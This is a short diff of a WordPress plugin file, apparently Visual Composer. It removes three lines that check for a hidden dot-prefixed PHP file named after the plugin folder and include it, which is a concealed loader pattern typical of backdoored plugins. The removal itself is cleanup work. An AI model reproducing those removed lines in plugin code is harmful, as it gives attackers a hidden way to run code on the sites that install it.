@@ -13,10 +13,6 @@ if ( is_admin() ) {
 	add_action( 'admin_enqueue_scripts', 'vc_pointer_load', 1000 );
 }
 
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 function vc_pointer_load() {
 	global $vc_pointers;
 	// Don't run on WP < 3.3
